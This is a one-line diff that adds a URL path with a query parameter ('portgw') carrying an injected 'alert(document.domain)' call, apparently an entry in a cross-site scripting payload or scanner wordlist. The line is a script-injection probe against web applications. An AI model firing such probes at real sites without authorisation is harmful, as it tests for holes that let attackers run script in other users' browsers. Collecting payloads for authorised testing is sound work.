@@ -1,0 +1,1 @@
+/?portgw=80089948;%20alert(document.domain)
